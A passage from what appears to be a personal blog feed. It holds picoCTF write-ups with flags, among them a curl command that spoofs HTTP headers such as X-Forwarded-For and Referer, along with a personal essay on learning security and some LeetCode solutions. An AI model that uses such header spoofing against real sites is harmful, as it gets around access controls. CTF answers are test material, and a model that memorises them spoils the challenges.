class="keyword">if</span> ((<span class="variable">$type1</span> == <span class="string">&quot;application/pdf&quot;</span>) &amp;&amp; (<span class="variable">$type2</span> == <span class="string">&quot;application/pdf&quot;</span>)) &#123;</span><br><span class="line">            <span class="variable">$contents1</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file1&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">            <span class="variable">$contents2</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file2&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$contents1</span> != <span class="variable">$contents2</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">md5_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file1&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]) == <span class="title function_ invoke__">md5_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file2&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>])) &#123;</span><br><span class="line">                    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line">                    <span class="keyword">die</span>();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;MD5 hashes do not match!&quot;</span>;</span><br><span class="line">                    <span class="keyword">die</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Files are not different!&quot;</span>;</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Not a PDF!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File too large!&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// FLAG: picoCTF&#123;c0ngr4ts_u_r_1nv1t3d_73b0c8ad&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;It is my Birthday&lt;/title&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;link href=<span class="string">&quot;https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;link href=<span class="string">&quot;https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script src=<span class="string">&quot;https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script src=<span class="string">&quot;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">header</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">h3</span> <span class="title">class</span>=&quot;<span class="title">text</span>-<span class="title">muted</span>&quot;&gt;<span class="title">It</span> <span class="title">is</span> <span class="title">my</span> <span class="title">Birthday</span>&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">jumbotron</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">p</span> <span class="title">class</span>=&quot;<span class="title">lead</span>&quot;&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">xs</span>-12 <span class="title">col</span>-<span class="title">sm</span>-12 <span class="title">col</span>-<span class="title">md</span>-12&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">h3</span>&gt;<span class="title">See</span> <span class="title">if</span> <span class="title">you</span> <span class="title">are</span> <span class="title">invited</span> <span class="title">to</span> <span class="title">my</span> <span class="title">party</span>!&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">br</span>/&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">upload</span>-<span class="title">form</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">form</span> <span class="title">role</span>=&quot;<span class="title">form</span>&quot; <span class="title">action</span>=&quot;/<span class="title">index</span>.<span class="title">php</span>&quot; <span class="title">method</span>=&quot;<span class="title">post</span>&quot; <span class="title">enctype</span>=&quot;<span class="title">multipart</span>/<span class="title">form</span>-<span class="title">data</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">file</span>&quot; <span class="title">name</span>=&quot;<span class="title">file1</span>&quot; <span class="title">id</span>=&quot;<span class="title">file1</span>&quot; <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span> <span class="title">input</span>-<span class="title">lg</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">file</span>&quot; <span class="title">name</span>=&quot;<span class="title">file2</span>&quot; <span class="title">id</span>=&quot;<span class="title">file2</span>&quot; <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span> <span class="title">input</span>-<span class="title">lg</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">xs</span>-12 <span class="title">col</span>-<span class="title">sm</span>-12 <span class="title">col</span>-<span class="title">md</span>-12&quot;&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span> <span class="title">btn</span>-<span class="title">success</span> <span class="title">btn</span>-<span class="title">block</span>&quot; <span class="title">name</span>=&quot;<span class="title">submit</span>&quot; <span class="title">value</span>=&quot;<span class="title">Upload</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">footer</span> <span class="title">class</span>=&quot;<span class="title">footer</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">p</span>&gt;&amp;<span class="title">copy</span>; <span class="title">PicoCTF</span>&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">footer</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">$(<span class="title">document</span>).<span class="title">ready</span>(<span class="title">function</span>()</span>&#123;</span><br><span class="line">    $(<span class="string">&quot;.close&quot;</span>).<span class="title function_ invoke__">click</span>(function()&#123;</span><br><span class="line">        $(<span class="string">&quot;myAlert&quot;</span>).<span class="title function_ invoke__">alert</span>(<span class="string">&quot;close&quot;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><blockquote><p>flag: picoCTF{c0ngr4ts_u_r_1nv1t3d_73b0c8ad}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> picoCTF </tag>
            
            <tag> Web Exploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>picoCTF Who are you? [100 points]</title>
      <link href="/2023/12/24/CTF/picoCTF/Web%20Exploitation/Who%20are%20you/posts/"/>
      <url>/2023/12/24/CTF/picoCTF/Web%20Exploitation/Who%20are%20you/posts/</url>
      
        <content type="html"><![CDATA[<h1 id="Who-are-you"><a href="#Who-are-you" class="headerlink" title="Who are you?"></a>Who are you?</h1><p>points:100</p><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote><p>Let me in. Let me iiiiiiinnnnnnnnnnnnnnnnnnnn <a href="http://mercury.picoctf.net:38322/">http://mercury.picoctf.net:38322/</a></p></blockquote><h2 id="Hints"><a href="#Hints" class="headerlink" title="Hints"></a>Hints</h2><blockquote><p>It ain’t much, but it’s an RFC <a href="https://tools.ietf.org/html/rfc2616">https://tools.ietf.org/html/rfc2616</a></p></blockquote><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>一開始可以看到網頁有個提示：use PicoBrowser<br><img src="https://i.imgur.com/Fo1yJgi.png" alt="Image"></p><h3 id="User-Agent-PicoBrowser"><a href="#User-Agent-PicoBrowser" class="headerlink" title="User-Agent: PicoBrowser"></a>User-Agent: PicoBrowser</h3><blockquote><p>I don’t trust users visiting from another site.</p></blockquote><h3 id="Referer-http-mercury-picoctf-net-38322"><a href="#Referer-http-mercury-picoctf-net-38322" class="headerlink" title="Referer: http://mercury.picoctf.net:38322/"></a>Referer: <a href="http://mercury.picoctf.net:38322/">http://mercury.picoctf.net:38322/</a></h3><blockquote><p>Sorry, this site only worked in 2018.</p></blockquote><h3 id="Date-2018"><a href="#Date-2018" class="headerlink" title="Date: 2018"></a>Date: 2018</h3><blockquote><p>I don’t trust users who can be tracked.</p></blockquote><h3 id="DNT-1"><a href="#DNT-1" class="headerlink" title="DNT: 1"></a>DNT: 1</h3><blockquote><p>This website is only for people from Sweden.</p></blockquote><h3 id="X-Forwarded-For-2-16-66-0"><a href="#X-Forwarded-For-2-16-66-0" class="headerlink" title="X-Forwarded-For: 2.16.66.0"></a>X-Forwarded-For: 2.16.66.0</h3><blockquote><p>You’re in Sweden but you don’t speak Swedish?</p></blockquote><h3 id="Accept-Language-sv"><a href="#Accept-Language-sv" class="headerlink" title="Accept-Language: sv"></a>Accept-Language: sv</h3><blockquote><p>What can I say except, you are welcome</p></blockquote><p>使用curl更改配送後送出得到flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://mercury.picoctf.net:38322/&#x27;</span> \</span><br><span class="line">--header <span class="string">&#x27;User-Agent: PicoBrowser&#x27;</span> \</span><br><span class="line">--header <span class="string">&#x27;Referer: http://mercury.picoctf.net:38322/&#x27;</span> \</span><br><span class="line">--header <span class="string">&#x27;Date: 2018&#x27;</span> \</span><br><span class="line">--header <span class="string">&#x27;DNT: 1&#x27;</span> \</span><br><span class="line">--header <span class="string">&#x27;X-Forwarded-For: 2.16.66.0&#x27;</span> \</span><br><span class="line">--header <span class="string">&#x27;Accept-Language: sv&#x27;</span></span><br></pre></td></tr></table></figure><p>flag: picoCTF{http_h34d3rs_v3ry_c0Ol_much_w0w_b22d773c}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> picoCTF </tag>
            
            <tag> Web Exploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>picoCTF vault-door-training [50 points]</title>
      <link href="/2023/12/22/CTF/picoCTF/Reverse%20Engineering/vault-door-training/vault-door-training/"/>
      <url>/2023/12/22/CTF/picoCTF/Reverse%20Engineering/vault-door-training/vault-door-training/</url>
      
        <content type="html"><![CDATA[<h1 id="vault-door-training"><a href="#vault-door-training" class="headerlink" title="vault-door-training"></a>vault-door-training</h1><p>Points:50</p><h1 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h1><blockquote><p>Your mission is to enter Dr. Evil’s laboratory and retrieve the blueprints for his Doomsday Project. The laboratory is protected by a series of locked vault doors. Each door is controlled by a computer and requires a password to open. Unfortunately, our undercover agents have not been able to obtain the secret passwords for the vault doors, but one of our junior agents obtained the source code for each vault’s computer! You will need to read the source code for each level to figure out what the password is for that vault door. As a warmup, we have created a replica vault in our training facility. The source code for the training vault is here: VaultDoorTraining.java</p></blockquote><h2 id="Hint"><a href="#Hint" class="headerlink" title="Hint"></a>Hint</h2><blockquote><p>The password is revealed in the program’s source code.</p></blockquote><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>打開source code，發現此function</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">checkPassword</span><span class="params">(String password)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> password.equals(<span class="string">&quot;w4rm1ng_Up_w1tH_jAv4_be8d9806f18&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><blockquote><p>picoCTF{w4rm1ng_Up_w1tH_jAv4_be8d9806f18}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> picoCTF </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>學習資訊安全動機與歷程</title>
      <link href="/2023/04/21/%E8%B3%87%E5%AE%89%E7%9B%B8%E9%97%9C/%E5%BF%83%E5%BE%97/2023-04-21-Learning-CyberSecurity/"/>
      <url>/2023/04/21/%E8%B3%87%E5%AE%89%E7%9B%B8%E9%97%9C/%E5%BF%83%E5%BE%97/2023-04-21-Learning-CyberSecurity/</url>
      
        <content type="html"><![CDATA[<h2 id="家庭背景的不同"><a href="#家庭背景的不同" class="headerlink" title="家庭背景的不同"></a>家庭背景的不同</h2><p>在我幼稚園小班的時候我爸就買了一台專屬於我的電腦，並完全不限制我使用的時間，我爸這麼做的目的竟是為了讓我不沉迷於電玩，他認為只要夠早接觸到電玩遲早會玩膩，這樣子以後就不會沉迷電玩，而果真在我一開始拿到電腦的我就像來到天堂似的每天拼命的玩，但到了國小我發現比起玩遊戲，我更喜歡的是研究遊戲是怎麼運作起來的，更想知道原理，所以便打開了我的資安歷程。</p><h2 id="資安動機的萌芽"><a href="#資安動機的萌芽" class="headerlink" title="資安動機的萌芽"></a>資安動機的萌芽</h2><p>在我幼稚園還沉溺於楓之谷這款遊戲的期間發生了我人生的一項轉淚點，我清楚地記得在我幼稚園中班放學後，我滿心期待的v75版海盜新職業更新的那一晚，我正創好剛出的新職業，我的帳號突然被登出，而在我重登進遊戲後我發現，我本尊的點裝與裝備全沒了，當時雖然我還小，但那個創傷我到現在還清楚地記得，從那時候我開始用我老爸的PTT到處發文(對我那時候就會用PTT)，看完鄉民的留言我才知道原來我被駭客給盜了，從那時候我開始有了資安的意識，並希望自己有一天可以防止這種情形再次發生。</p><h2 id="資安技術的歷程"><a href="#資安技術的歷程" class="headerlink" title="資安技術的歷程"></a>資安技術的歷程</h2><h3 id="小學階段"><a href="#小學階段" class="headerlink" title="小學階段"></a>小學階段</h3><p>到了小學三四年級我開始接觸到了Minecraft，在那時我對Minecraft這款能夠自己加入模組的客製化遊戲非常著迷，於是當時我決定架設一個含模組的私人伺服器，在當時的私人伺服器不像現在一樣成熟，更何況是包含第三方模組的伺服器可能需要非常理解程式與網路的運作觀念，但那時我的想法是:竟然我比其他人都早接觸電腦那我架設成功的機率應該更高一些，就憑這股動力於是我開始自學一些網路知識，包括NAT ，port forwarding， DMZ等網路技術與java程式語言，研究如何將別人寫好的code與server 串接，最後竟然真的架成功了，這讓我理解許多網路觀念與程式設計的實作<br>在我小學五六年級時，手機遊戲開始盛行，那時候有許多大大小小的單機遊戲，例如:Temple Run ， Subway Surfers，又或是神魔之塔，我還記得那時是因為我神魔之塔的轉珠真的非常爛，常常花寶石復活還打不過封王，那時為了去使用自動轉珠軟體，需要將手機解所root的權限，進而接觸到了手機root，而root後開始玩一些需要大權限的軟體，例如燒餅修改器(類似Cheat Engine)在那時候有了逆向程式與記憶體的概念，而那時候因為太多同學常常找我幫忙改值而我又不喜歡花時間去用搜尋法慢慢找記憶體位置，所以有去研究寫組合語言腳本達成快速處理。</p><h3 id="國中階段"><a href="#國中階段" class="headerlink" title="國中階段"></a>國中階段</h3><p>國中是我最叛逆的時候，而在某一天我去書局看到了一本Kali Linux滲透測試工具，當時一翻開書就看到裡面介紹非常多滲透測試的工具讓我非常的興奮，馬上就想買回家裡研讀，還記得當時錢不夠還先跟朋友借了錢(因為那本要1000)，在研讀完這本書後，因為那時一直想要實際的演練，但不知道亂攻擊設備會有法律責任，所以在國中上電腦課時使用了live 版的kali linux裝在usb裡，乘開機時進bios切換系統，在上課的時候攻擊了學校的網站，當下學校的網路中心馬上就發現流量的異常於是我被當場抓包，記了兩支大過，老師甚至說要交給警方處理(最後私下處理)，從那之後我才知道學習紅隊演練原來是要防止攻擊，而不是去攻擊別人。</p><h3 id="高中階段"><a href="#高中階段" class="headerlink" title="高中階段"></a>高中階段</h3><p>高一時因為不想讀太遠的學校所以選擇就讀離家近的新北高工，也因為入學成績較高，所以被主任詢問要不要當技能競賽的選手，而我毅然決然地答應並選擇了資訊與網路技術的職類，在這個職類中需要根據題目的需求架設出相對應的服務，有些功能可能網路上找不到教學，必須靠自己的網路觀念去實作出來，例如:架設Apache Server 具有 Load Balancer功能可能比賽前沒有記住如何設定的話可以使用DNS cache的機制去做到，而我在這個職類中我學習到了更多伺服器的架設與Cisco網路的設定，還有靈活運用所學技能創造出更多的可能。<br>而在我高二的時候因為國際技能競賽加了新的職類「網路安全」，當時我有參加第一次的選拔，因為國際賽時程的關係，必須在比賽前選出國手，所以採學科決定國手選拔名單，而在我高二那年成功晉級到了國手選拔賽，但可惜最後的決賽沒有選上國手，不過這讓我有更想繼續比網路安全這項職類的渴望<br>而到了高三我決定再比一次「網路安全」，但我們主任很反對，他說我們學校資源只會分配在比較有成績的職類上例如: 「網頁設計」 「商務軟體設計」這兩項職類都有國手學長姊的幫助，所以當我要報名「網路安全」時是沒辦法申請經費的，而那時的我就決定自費參加，最後在我和我隊友的努力下成功獲得第51屆全國決賽的第一名，在這比賽中學習到了伺服器安全的強化，數位鑑識，IDS&#x2F;IPS系統的架設等還有許多CTF比賽中的技巧，使我獲益良多。</p><h3 id="大學階段"><a href="#大學階段" class="headerlink" title="大學階段"></a>大學階段</h3><p>在大學開學前我參加了我第一次的AIS3 2022(軟體安全組)，在裡面認識了許多志同道合的好朋友甚至是貴人，而最令我印象深刻的課是關鍵基礎設施有關烏克蘭電廠事件，聽完我才知道原來不是IT資安很重要OT也非常重要，所以在開學後我擔任了臺科大工業 4.0 中心工控紅藍隊演練研究助理，並持續精進邁向資安的道路。</p>]]></content>
      
      
      <categories>
          
          <category> 資安相關 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 心得 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode[107] Binary Tree Level Order Traversal II</title>
      <link href="/2022/06/07/%E7%A8%8B%E5%BC%8F%E6%BC%94%E7%AE%97/2022-06-07-LeetCode-107/"/>
      <url>/2022/06/07/%E7%A8%8B%E5%BC%8F%E6%BC%94%E7%AE%97/2022-06-07-LeetCode-107/</url>
      
        <content type="html"><![CDATA[<h2 id="107-Binary-Tree-Level-Order-Traversal-II"><a href="#107-Binary-Tree-Level-Order-Traversal-II" class="headerlink" title="107. Binary Tree Level Order Traversal II"></a>107. Binary Tree Level Order Traversal II</h2><p>難度:Medium</p><p>Python:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, val=0, left=None, right=None):</span></span><br><span class="line"><span class="comment">#         self.val = val</span></span><br><span class="line"><span class="comment">#         self.left = left</span></span><br><span class="line"><span class="comment">#         self.right = right</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">root, depth, result</span>):</span><br><span class="line">    <span class="keyword">if</span> root == <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> depth == <span class="built_in">len</span>(result):</span><br><span class="line">        result.append([])</span><br><span class="line">        </span><br><span class="line">    result[depth].append(root.val)</span><br><span class="line">    </span><br><span class="line">    dfs(root.left, depth+<span class="number">1</span>, result)</span><br><span class="line">    dfs(root.right, depth+<span class="number">1</span>, result)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">levelOrderBottom</span>(<span class="params">self, root: <span class="type">Optional</span>[TreeNode]</span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span><br><span class="line">        result = []</span><br><span class="line">        dfs(root,<span class="number">0</span>,result)</span><br><span class="line">        result.reverse()</span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>C++:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(TreeNode* root, <span class="type">int</span> depth, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; result)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="literal">nullptr</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(depth == result.<span class="built_in">size</span>()) &#123;</span><br><span class="line">        result.<span class="built_in">push_back</span>(&#123;&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    result[depth].<span class="built_in">push_back</span>(root-&gt;val);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">dfs</span>(root-&gt;left,depth+<span class="number">1</span>,result);</span><br><span class="line">    <span class="built_in">dfs</span>(root-&gt;right, depth+<span class="number">1</span>,result);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">levelOrderBottom</span>(TreeNode* root) &#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; result;</span><br><span class="line">        <span class="built_in">dfs</span>(root, <span class="number">0</span>, result);</span><br><span class="line">        <span class="built_in">reverse</span>(<span class="built_in">begin</span>(result), <span class="built_in">end</span>(result));</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 程式演算 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode[441] Arranging Coins</title>
      <link href="/2022/06/04/%E7%A8%8B%E5%BC%8F%E6%BC%94%E7%AE%97/2022-06-04-LeetCode-441/"/>
      <url>/2022/06/04/%E7%A8%8B%E5%BC%8F%E6%BC%94%E7%AE%97/2022-06-04-LeetCode-441/</url>
      
        <content type="html"><![CDATA[<h2 id="441-Arranging-Coins"><a href="#441-Arranging-Coins" class="headerlink" title="441. Arranging Coins"></a>441. Arranging Coins</h2><p>難度:Easy</p><p>Python:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">arrangeCoins</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="comment"># r: 把第 1 ~ k 層塞滿會用到多少硬幣</span></span><br><span class="line">    r = <span class="number">0</span></span><br><span class="line">    <span class="comment"># k: 目前要塞的是第幾層</span></span><br><span class="line">    k = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r += k     </span><br><span class="line">        <span class="keyword">if</span> r &gt; n:</span><br><span class="line">            <span class="keyword">return</span> k - <span class="number">1</span></span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line">            </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">arrangeCoins</span>(<span class="params">self, n:<span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">return</span> arrangeCoins(n)</span><br></pre></td></tr></table></figure><p>Python 公式解:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">arrangeCoins</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">int</span>)((<span class="number">2</span> * n + <span class="number">0.25</span>)**<span class="number">0.5</span> - <span class="number">0.5</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 程式演算 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django 資料庫CRUD</title>
      <link href="/2022/06/01/%E5%BE%8C%E7%AB%AF%E7%9B%B8%E9%97%9C/2022-06-01-Django%20CRUD/"/>
      <url>/2022/06/01/%E5%BE%8C%E7%AB%AF%E7%9B%B8%E9%97%9C/2022-06-01-Django%20CRUD/</url>
      
